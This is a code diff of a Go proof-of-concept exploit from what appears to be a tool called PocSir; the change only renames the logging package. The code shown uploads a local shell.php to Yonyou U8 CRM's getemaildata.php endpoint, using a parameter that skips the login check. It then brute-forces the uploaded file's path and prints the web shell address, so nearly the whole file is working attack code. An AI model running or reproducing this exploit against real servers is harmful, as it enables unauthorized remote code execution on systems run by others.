@@ -1,7 +1,7 @@
 package poc
 
 import (
-	"PocSir/common"
+	"PocSir/config"
 	"bufio"
 	"bytes"
 	"crypto/tls"
@@ -24,20 +24,20 @@ func U8CRM_upload_exp(target string) {
 	//创建文件表单字段
 	file, err := writer.CreateFormFile("file", filePath)
 	if err != nil {
-		common.ErrMsg.Println(err)
+		config.ErrMsg.Println(err)
 		return
 	}
 
 	//打开文件并复制到表单缓冲区
 	open, err := os.Open("shell.php")
 	if err != nil {
-		common.ErrMsg.Println(err)
+		config.ErrMsg.Println(err)
 		return
 	}
 	defer open.Close()
 	_, err = io.Copy(file, open)
 	if err != nil {
-		common.ErrMsg.Println(err)
+		config.ErrMsg.Println(err)
 		return
 	}
 	// 添加空文件
@@ -45,14 +45,14 @@ func U8CRM_upload_exp(target string) {
 
 	err = writer.Close()
 	if err != nil {
-		common.ErrMsg.Println(err)
+		config.ErrMsg.Println(err)
 		return
 	}
 
 	//创建POST请求
 	req, err := http.NewRequest("POST", target+"/ajax/getemaildata.php?DontCheckLogin=1", body)
 	if err != nil {
-		common.ErrMsg.Println(err)
+		config.ErrMsg.Println(err)
 		return
 	}
 	req.Header.Set("Content-Type", writer.FormDataContentType())
@@ -66,13 +66,13 @@ func U8CRM_upload_exp(target string) {
 	}
 	resp, err := client.Do(req)
 	if err != nil {
-		common.ErrMsg.Println(err)
+		config.ErrMsg.Println(err)
 	}
 	defer resp.Body.Close()
 
 	read, err := io.ReadAll(resp.Body)
 	if err != nil {
-		common.ErrMsg.Println(err)
+		config.ErrMsg.Println(err)
 	}
 
 	sucpatern := regexp.MustCompile("success")
@@ -80,7 +80,7 @@ func U8CRM_upload_exp(target string) {
 	fmt.Println(success)
 
 	if resp.StatusCode == 200 && success {
-		common.Right.Printf("[+]存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞\n")
+		config.Right.Printf("[+]存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞\n")
 		// 正则表达式模式
 		filePathPattern := `"filePath":"(.*?)"`
 
@@ -103,7 +103,7 @@ func U8CRM_upload_exp(target string) {
 			target = target + "/tmpfile/" + "upd" + one2
 			file, err := os.Open("hex_dictionary.txt")
 			if err != nil {
-				common.ErrMsg.Println("Open dict ErrMsg!")
+				config.ErrMsg.Println("Open dict ErrMsg!")
 			}
 			defer file.Close()
 
@@ -114,23 +114,23 @@ func U8CRM_upload_exp(target string) {
 				fileUrl := target + lastName + ".tmp.php"
 				resp, err := client.Head(fileUrl)
 				if err != nil {
-					common.ErrMsg.Printf("[-] Error:%v", err)
+					config.ErrMsg.Printf("[-] Error:%v", err)
 					continue
 				}
 				defer resp.Body.Close()
 
 				// 根据响应码判断是否存在
 				if resp.StatusCode == http.StatusOK {
-					common.Right.Printf("[+]Shell地址: %s\n" + fileUrl)
+					config.Right.Printf("[+]Shell地址: %s\n" + fileUrl)
 					break
 				} else {
 					continue
 				}
 			}
 		} else {
-			common.ErrMsg.Println("File Path not found")
+			config.ErrMsg.Println("File Path not found")
 		}
 	} else {
-		common.ErrMsg.Println("[-]不存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞")
+		config.ErrMsg.Println("[-]不存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞")
 	}
 }
